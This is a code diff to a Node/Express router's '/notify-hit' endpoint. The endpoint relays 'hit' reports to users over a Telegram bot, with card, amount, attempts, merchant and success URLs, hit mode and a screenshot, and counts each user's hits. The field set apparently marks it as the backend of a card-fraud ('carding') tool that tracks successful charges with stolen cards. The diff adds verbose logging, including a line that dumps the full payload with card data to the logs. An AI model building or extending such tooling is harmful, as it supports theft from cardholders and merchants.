@@ -544,10 +544,13 @@ router.post('/verify', verifyLimiter, async (req, res) => {
 
 // POST /api/tg/notify-hit - Send hit notification to user's Telegram (with optional screenshot)
 router.post('/notify-hit', async (req, res) => {
-  console.log('[HIT_NOTIFICATION] 🚨 ENDPOINT CALLED! 🚨');
+  console.log('[HIT_NOTIFICATION] 🚨🚨🚨 ENDPOINT CALLED! 🚨🚨🚨');
+  console.log('[HIT_NOTIFICATION] Timestamp:', new Date().toISOString());
   console.log('[HIT_NOTIFICATION] Payload keys:', Object.keys(req.body || {}));
+  console.log('[HIT_NOTIFICATION] Full payload:', JSON.stringify(req.body, null, 2));
+
   if (!BOT_TOKEN) {
-    console.warn('[HIT_NOTIFICATION] Bot token not configured - notifications will fail');
+    console.error('[HIT_NOTIFICATION] ❌ Bot token not configured - notifications will fail');
     // Don't reject, just log warning
   }
   const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec, current_url, merchant_url, business_url, hit_mode } = req.body || {};
@@ -878,11 +881,14 @@ router.post('/notify-hit', async (req, res) => {
     }
 
   if (result.ok) {
-    console.log('[HIT_NOTIFICATION] Notification sent successfully, incrementing hits for user:', tgId);
+    console.log('[HIT_NOTIFICATION] ✅ Personal notification sent successfully, incrementing hits for user:', tgId);
     incrementUserHits(tgId);
   } else {
-    console.error('[HIT_NOTIFICATION] Failed to send notification:', result.error);
+    console.error('[HIT_NOTIFICATION] ❌ Failed to send personal notification:', result.error);
   }
+
+  console.log('[HIT_NOTIFICATION] 🎯🎯🎯 FUNCTION COMPLETING 🎯🎯🎯');
+  console.log('[HIT_NOTIFICATION] Final result:', { ok: result.ok, error: result.error });
 
   return res.json({ ok: result.ok, error: result.error });
 });
